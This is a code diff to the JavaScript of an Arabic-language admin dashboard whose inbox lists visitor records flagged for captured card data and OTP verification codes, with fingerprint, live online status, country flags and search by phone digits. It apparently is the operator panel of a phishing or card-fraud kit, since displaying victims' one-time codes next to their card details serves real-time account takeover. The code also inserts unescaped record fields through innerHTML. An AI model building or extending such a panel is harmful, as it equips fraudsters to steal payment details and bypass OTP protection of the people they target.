@@ -202,73 +202,112 @@ async function loadStats() {
 /* ---------- الوارد ---------- */
 async function loadInbox() {
   const items = document.getElementById('inboxItems');
-  items.innerHTML = '<div class="empty-state">جارٍ التحميل...</div>';
+  items.innerHTML = '<div class="px-4 py-10 text-center text-sm text-gray-400">جارٍ التحميل...</div>';
   try {
-    const data = await api('/api/inbox?filter=all&limit=200');
+    const filter = state.currentFilter === 'card' ? 'card' : state.currentFilter === 'archive' ? 'archive' : 'all';
+    const data = await api('/api/inbox?filter=' + filter + '&limit=200');
     state.inbox = data.inbox || [];
     renderInbox();
   } catch (e) {
     if (e.message.includes('غير مصرّح')) {
       logout();
     } else {
-      items.innerHTML = '<div class="empty-state">فشل التحميل: ' + e.message + '</div>';
+      items.innerHTML = '<div class="px-4 py-10 text-center text-sm text-red-400">فشل التحميل: ' + e.message + '</div>';
     }
   }
+}
+
+// تحويل رمز الدولة (ISO) إلى علم إيموجي
+function countryFlag(code) {
+  if (!code || code.length !== 2) return '🌐';
+  return code.toUpperCase().replace(/./g, (c) => String.fromCodePoint(127397 + c.charCodeAt(0)));
+}
+
+// نص النشاط حسب نوع السجل
+function activityText(s) {
+  if (s.hasOtp) return 'رمز تحقق';
+  if (s.hasPayment) return 'بيانات بطاقة';
+  return 'زيارة جديدة';
 }
 
 function renderInbox() {
   const items = document.getElementById('inboxItems');
   let list = state.inbox;
 
-  // فلترة
+  // فلترة محلية (للبطاقة عند الحاجة)
   if (state.currentFilter === 'card') {
     list = list.filter((s) => s.hasPayment);
-  } else if (state.currentFilter === 'online') {
-    list = list.filter((s) => s.client?.online);
   }
   // بحث
   if (state.search) {
     const q = state.search.toLowerCase();
     list = list.filter((s) => {
       const c = s.client;
+      const last4 = c?.phone ? c.phone.slice(-4) : '';
       return (
         c?.full_name?.toLowerCase().includes(q) ||
-        c?.email?.toLowerCase().includes(q) ||
+        c?.fingerprint?.toLowerCase().includes(q) ||
         c?.phone?.includes(q) ||
-        s.reference?.toLowerCase().includes(q) ||
-        c?.fingerprint?.toLowerCase().includes(q)
+        last4.includes(q) ||
+        s.reference?.toLowerCase().includes(q)
       );
     });
   }
 
+  // عدّاد القائمة
+  const badge = document.getElementById('countBadge');
+  if (badge) badge.textContent = list.length;
+
   if (!list.length) {
-    items.innerHTML = '<div class="empty-state">لا توجد سجلات</div>';
+    items.innerHTML = '<div class="px-4 py-10 text-center text-sm text-gray-400">لا توجد سجلات</div>';
     return;
   }
 
   items.innerHTML = '';
   list.forEach((s) => {
-    const c = s.client;
-    const div = document.createElement('div');
-    div.className = 'inbox-item' + (s.client_id === state.selectedClientId ? ' selected' : '');
-    // المفروض نستخدم client.id للمطابقة
-    if (c?.id === state.selectedClientId) div.classList.add('selected');
-    div.onclick = () => selectClient(c.id);
-    div.innerHTML = `
-      <div class="row1">
-        <span class="name">${c?.full_name || '—'}</span>
-        <span class="time">${timeAgo(s.created_at)}</span>
+    const c = s.client || {};
+    const selected = c.id === state.selectedClientId;
+    const online = !!c.online;
+    const flag = countryFlag(c.country_code);
+
+    const cardIcons = s.hasPayment
+      ? `<span class="flex items-center gap-1">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="14" x="2" y="5" rx="2"></rect><line x1="2" x2="22" y1="10" y2="10"></line></svg>
+          <svg viewBox="0 0 50 16" fill="none"><text x="0" y="13" font-family="Arial, sans-serif" font-weight="900" font-size="15" fill="#1a1f71" letter-spacing="-0.5">VISA</text></svg>
+        </span>`
+      : '';
+
+    const row = document.createElement('div');
+    row.className =
+      'client-row flex items-center gap-3 px-4 py-3 cursor-pointer border-b border-gray-50 transition hover:bg-gray-50' +
+      (selected ? ' bg-blue-50/60' : '');
+    row.onclick = () => selectClient(c.id);
+    row.innerHTML = `
+      <div class="relative shrink-0">
+        <div class="w-10 h-10 rounded-full flex items-center justify-center text-white" style="background:linear-gradient(135deg,#4b5563,#374151);box-shadow:0 0 0 2px rgba(107,114,128,0.18)">
+          <svg viewBox="0 0 40 40" fill="none" class="w-7 h-7">
+            <circle cx="20" cy="14" r="7" fill="white" opacity="0.2"></circle>
+            <circle cx="20" cy="14" r="5" fill="white" opacity="0.5"></circle>
+            <path d="M6 36c0-7.732 6.268-14 14-14s14 6.268 14 14" fill="white" opacity="0.25"></path>
+          </svg>
+        </div>
+        <span class="absolute bottom-0 right-0 w-3 h-3 rounded-full border-2 border-white ${online ? 'bg-green-500' : 'bg-gray-300'}" title="${online ? 'متصل' : 'غير متصل'}"></span>
+        <span class="absolute -top-0.5 -left-0.5 text-xs" title="${c.country_name || ''}">${flag}</span>
       </div>
-      <div class="row2">
-        <span class="ref">${s.reference}</span>
-        <span class="tags">
-          <span class="status-dot ${c?.online ? 'online' : 'offline'}"></span>
-          ${s.hasPayment ? '<span class="tag card">💳</span>' : ''}
-          ${s.hasOtp ? '<span class="tag otp">OTP</span>' : ''}
-        </span>
+      <div class="flex-1 min-w-0">
+        <div class="flex items-center justify-between gap-2">
+          <div class="flex items-center gap-1.5 min-w-0">
+            <span class="text-sm font-semibold text-gray-800 truncate">${c.full_name || 'زائر'}</span>
+            ${cardIcons ? `<span class="text-gray-400 shrink-0">${cardIcons}</span>` : ''}
+          </div>
+          <span class="text-[11px] text-gray-400 shrink-0">${timeAgo(s.created_at)}</span>
+        </div>
+        <div class="mt-0.5">
+          <span class="text-xs text-gray-500">${activityText(s)}</span>
+        </div>
       </div>
     `;
-    items.appendChild(div);
+    items.appendChild(row);
   });
 }
 
@@ -533,12 +572,25 @@ document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('confirmBlockBtn').onclick = confirmBlock;
 
   // الفلاتر
-  document.querySelectorAll('.filter-btn').forEach((btn) => {
+  const filterBtns = document.querySelectorAll('.filter-btn');
+  const setActiveFilter = (name) => {
+    filterBtns.forEach((b) => {
+      const on = b.dataset.filter === name;
+      b.classList.toggle('bg-gray-800', on);
+      b.classList.toggle('text-white', on);
+      b.classList.toggle('text-gray-500', !on);
+    });
+  };
+  setActiveFilter('all');
+  filterBtns.forEach((btn) => {
     btn.onclick = () => {
-      document.querySelectorAll('.filter-btn').forEach((b) => b.classList.remove('active'));
-      btn.classList.add('active');
+      const prev = state.currentFilter;
       state.currentFilter = btn.dataset.filter;
-      renderInbox();
+      setActiveFilter(state.currentFilter);
+      // التبديل بين الوارد والأرشيف يتطلب إعادة التحميل من الخادم
+      const needsReload = (prev === 'archive') !== (state.currentFilter === 'archive');
+      if (needsReload) loadInbox();
+      else renderInbox();
     };
   });
 
@@ -547,6 +599,14 @@ document.addEventListener('DOMContentLoaded', () => {
     state.search = e.target.value;
     renderInbox();
   };
+
+  // تحديد الكل
+  const selectAllBtn = document.getElementById('selectAllBtn');
+  if (selectAllBtn) {
+    selectAllBtn.onclick = () => {
+      document.querySelectorAll('#inboxItems .client-row').forEach((r) => r.click());
+    };
+  }
 
   // التحقق التلقائي من التوكن
   if (state.token) {
